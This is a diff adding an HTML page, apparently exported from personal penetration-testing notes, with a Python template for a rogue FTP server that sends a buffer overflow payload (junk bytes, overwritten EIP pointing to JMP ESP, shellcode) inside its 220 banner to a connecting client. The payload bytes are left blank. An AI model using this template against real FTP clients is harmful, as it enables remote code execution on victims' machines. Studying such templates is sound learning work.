@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>send payload for Buffer Overflow application(single message)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>send payload for Buffer Overflow application(single message)</h1><br/><div class="codebox"><div class="codebox">#!/usr/bin/python<br /><br />from&nbsp;socket&nbsp;import&nbsp;*<br /><br />payload&nbsp;=&nbsp;&quot;&nbsp;&quot;&nbsp;&nbsp;#hexadecimal&nbsp;Junk&nbsp;Bytes&nbsp;needed&nbsp;to&nbsp;reach&nbsp;the&nbsp;EIP<br />payload+=&quot;&nbsp;&quot;&nbsp;&nbsp;#overwrite&nbsp;EIP&nbsp;address&nbsp;with&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;JMP/CALL&nbsp;ESP,&nbsp;hexadecimal&nbsp;in&nbsp;swapped&nbsp;order&nbsp;because&nbsp;we&nbsp;are&nbsp;in&nbsp;little-endian<br />payload+=(&quot;&nbsp;&quot;)&nbsp;#Shellcode,&nbsp;this&nbsp;is&nbsp;the&nbsp;code&nbsp;that&nbsp;we&nbsp;want&nbsp;execute&nbsp;on&nbsp;the&nbsp;target&nbsp;machine&nbsp;if&nbsp;the&nbsp;Buffer&nbsp;Overflow&nbsp;works<br /><br />s&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM)<br />s.bind((&quot;0.0.0.0&quot;,&nbsp;21))<br />s.listen(1)<br />print&nbsp;&quot;[+]&nbsp;Listening&nbsp;on&nbsp;[FTP]&nbsp;21&quot;<br />c,&nbsp;addr&nbsp;=&nbsp;s.accept()<br /><br />print&nbsp;&quot;[+]&nbsp;Connection&nbsp;accepted&nbsp;from:&nbsp;%s&quot;&nbsp;%&nbsp;(addr[0])<br /><br />c.send(&quot;220&nbsp;&quot;+payload+&quot;\r\n&quot;)&nbsp;&nbsp;#once&nbsp;the&nbsp;client&nbsp;connect&nbsp;with&nbsp;this&nbsp;server&nbsp;listener,&nbsp;this&nbsp;server&nbsp;reply&nbsp;with&nbsp;220&nbsp;code<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#followed&nbsp;by&nbsp;our&nbsp;payload<br />c.recv(1024)<br />c.close()<br />print&nbsp;&quot;[+]&nbsp;Client&nbsp;exploited&nbsp;!!&nbsp;quitting&quot;<br />s.close<span style="color:#000000;font-weight:400">()</span></div></div> <br /></div>
+</body>
+</html>
